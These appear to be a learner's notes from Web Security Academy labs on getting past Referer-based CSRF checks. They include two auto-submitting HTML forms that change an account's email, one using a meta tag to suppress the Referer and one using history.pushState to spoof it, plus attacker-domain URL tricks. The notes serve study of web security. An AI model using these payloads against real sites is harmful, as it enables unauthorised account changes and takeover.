# Bypassing Referer-based CSRF defenses

Referer is an optional header, contains the URL that linked to the requested resource. 

Linking page could be withhold or modified for privacy.


Some apps validate the Referer when present but skip if header is omitted.

Attacker could craft CSRF to drop Referer in resulting request.

`<meta name="referrer" content="never">`

### Example:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<meta name="referrer" content="never">
<form action="https://0a4a00df048d229180390378002c0017.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="wiener4&#64;normal&#45;user&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
  <img src="" onerror="document.forms[0].submit()">
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Validation of Referer can be circumvented

If validates Referer to start with a value, could make a subdomain with own domain

`http://vulnerable-website.com.attacker-website.com/csrf-attack`

If validates referer contain its own domain

`http://attacker-website.com/csrf-attack?vulnerable-website.com`

*many browsers now controll this

*can override this behavior with Referrer-Policy: `unsafe-url`. This ensures the whole URL will be sent, including the query string

### Example:

Response header:

`Referrer-Policy: unsafe-url`
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<form action="https://0a510068049afe1e811334ec00960090.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="wiener7&#64;normal&#45;user&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
<script>
history.pushState("", "", "/?0a510068049afe1e811334ec00960090.web-security-academy.net");
</script>
  <img src="" onerror="document.forms[0].submit()">
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
